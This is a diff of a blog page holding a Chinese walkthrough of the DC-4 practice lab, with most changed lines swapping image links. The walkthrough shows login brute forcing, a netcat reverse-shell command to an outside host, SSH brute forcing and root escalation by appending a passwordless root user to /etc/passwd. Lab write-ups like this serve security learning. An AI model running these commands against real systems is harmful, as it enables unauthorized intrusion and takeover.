@@ -10,8 +10,8 @@ vulhub系列之DC4靶场
 VMware虚拟机
 kali
 
-爆破网站管理员用户拿shell
-由目标靶机的Mac地址可以得出靶机IP为｀192.168.43.140｀．nmap扫描结果得知目标靶机开放了80端口和22端口，所以只能从目">
+爆破网站管理员用户拿shell   
+由目标靶机的Mac地址可以得出靶机IP为｀192.168.43.140｀．nmap扫描结果得知目标靶机开放了80端口和22端口，所以只">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -373,36 +373,36 @@ kali
 <li>VMware虚拟机</li>
 <li>kali</li>
 </ol>
-<h1 id="爆破网站管理员用户拿shell"><a href="#爆破网站管理员用户拿shell" class="headerlink" title="爆破网站管理员用户拿shell"></a>爆破网站管理员用户拿shell</h1><p><img src="https://img-blog.csdnimg.cn/20210509114225310.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDA1MzgxOA==,size_16,color_FFFFFF,t_70"></p>
+<h1 id="爆破网站管理员用户拿shell"><a href="#爆破网站管理员用户拿shell" class="headerlink" title="爆破网站管理员用户拿shell"></a><strong>爆破网站管理员用户拿shell</strong></h1><p><img src="/2021/05/08/dc4/050901.png">   </p>
 <p>由目标靶机的Mac地址可以得出靶机IP为｀192.168.43.140｀．nmap扫描结果得知目标靶机开放了80端口和22端口，所以只能从目标网站下手。直接进入网首页。    </p>
-<p><img src="https://img-blog.csdnimg.cn/20210509114237301.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDA1MzgxOA==,size_16,color_FFFFFF,t_70"></p>
+<p><img src="/2021/05/08/dc4/050902.png">    </p>
 <p>根据首页信息可以知道，有admin用户，所以直接用burpsuite爆破，用软件自带密码即可。   </p>
-<p><img src="https://img-blog.csdnimg.cn/2021050911425012.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDA1MzgxOA==,size_16,color_FFFFFF,t_70"></p>
-<p><img src="https://img-blog.csdnimg.cn/20210509114301441.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDA1MzgxOA==,size_16,color_FFFFFF,t_70"></p>
+<p><img src="/2021/05/08/dc4/050903.png">   </p>
+<p><img src="/2021/05/08/dc4/050904.png">     </p>
 <p>爆破成功，密码是happy。登陆进去发现是命令执行，所以直接抓包改数据，反弹shell。</p>
-<p><img src="https://img-blog.csdnimg.cn/20210509114313327.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDA1MzgxOA==,size_16,color_FFFFFF,t_70"></p>
-<p><img src="https://img-blog.csdnimg.cn/20210509114322384.png"></p>
+<p><img src="/2021/05/08/dc4/050905.png">   </p>
+<p><img src="/2021/05/08/dc4/050906.png">   </p>
 <p>反弹shell成功，是用nc反弹成功的，bash我没有反弹成功，不知道是哪里出问题了。反弹shell命令为：</p>
 <pre class="line-numbers language-none"><code class="language-none">nc -e /bin/bash 192.168.43.173 12345<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>并且在得到的shll用<code>python -c 'import pty;pty.spawn("/bin/bash")'</code>反弹一个完整shll。接下来就是一顿文件查看。看看有没有什么可以利用的信息。    </p>
-<h1 id="SSH爆破密码"><a href="#SSH爆破密码" class="headerlink" title="SSH爆破密码"></a>SSH爆破密码</h1><p><img src="https://img-blog.csdnimg.cn/20210509114339435.png"></p>
+<h1 id="SSH爆破密码"><a href="#SSH爆破密码" class="headerlink" title="SSH爆破密码"></a><strong>SSH爆破密码</strong></h1><p><img src="/2021/05/08/dc4/050907.png"></p>
 <p>最终在/home/jim/backups目录下找到了一份密码文件，所以直接用这份密码文件ssh爆破jim。</p>
-<p><img src="https://img-blog.csdnimg.cn/20210509114350199.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDA1MzgxOA==,size_16,color_FFFFFF,t_70"></p>
+<p><img src="/2021/05/08/dc4/050908.png">    </p>
 <p>爆破成功，jim/jibril04直接ssh连接。  </p>
-<p><img src="https://img-blog.csdnimg.cn/20210509114359683.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDA1MzgxOA==,size_16,color_FFFFFF,t_70"></p>
+<p><img src="/2021/05/08/dc4/050909.png">  </p>
 <p>查看mbox,可以看出这是一个邮箱信息，所以查看邮箱内容(邮箱默认路径为/var/mail)   </p>
-<p><img src="https://img-blog.csdnimg.cn/20210509114410641.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDA1MzgxOA==,size_16,color_FFFFFF,t_70"></p>
+<p><img src="/2021/05/08/dc4/050910.png">    </p>
 <p>邮箱内容是charles发的，并且告诉了密码，所以直接su切换charles。   </p>
-<p><img src="https://img-blog.csdnimg.cn/20210509114422851.png"></p>
-<h1 id="teehee提权"><a href="#teehee提权" class="headerlink" title="teehee提权"></a>teehee提权</h1><p>进入charles，查看是否有什么提示信息。没发现可以用的信息。所以看看有不有可以提权的利用点，输入命令<code>sudo -l</code>后发现teehee不需要命令就可以执行root权限。于是查看teehee的帮助信息。   </p>
-<p><img src="https://img-blog.csdnimg.cn/20210509114439857.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDA1MzgxOA==,size_16,color_FFFFFF,t_70"></p>
+<p><img src="/2021/05/08/dc4/050911.png">    </p>
+<h1 id="teehee提权"><a href="#teehee提权" class="headerlink" title="teehee提权"></a><strong>teehee提权</strong></h1><p>进入charles，查看是否有什么提示信息。没发现可以用的信息。所以看看有不有可以提权的利用点，输入命令<code>sudo -l</code>后发现teehee不需要命令就可以执行root权限。于是查看teehee的帮助信息。   </p>
+<p><img src="/2021/05/08/dc4/050913.png">    </p>
 <p>发现teehee的<code>-a</code>参数可以在文件后面加入内容，所以想到可以在/etc/passwd文件加入具有root权限的自定义用户名，并且可以不设置密码。所以根据/etc/passwd文件下的内容格式自定义用户。<br>/etc/passwd文件下的用户格式为：<br><code>用户名:密码占位符:用户id:组id:备注信息:家目录:命令执行环境</code><br>当密码占位符为空时，用户没有密码。</p>
 <p>执行命令：</p>
 <pre class="line-numbers language-none"><code class="language-none">echo 'admin::0:0::/home/admin:/bin/bash' |sudo teehee -a /etc/passwd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://img-blog.csdnimg.cn/20210509114457921.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDA1MzgxOA==,size_16,color_FFFFFF,t_70"></p>
+<p><img src="/2021/05/08/dc4/050915.png">   </p>
 <p>直接切换自定义用户，提权成功。    </p>
-<p><img src="https://img-blog.csdnimg.cn/20210509114509700.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDA1MzgxOA==,size_16,color_FFFFFF,t_70"></p>
+<p><img src="/2021/05/08/dc4/050916.png">    </p>
 <p>加入/root下拿到flag.</p>
 
                 
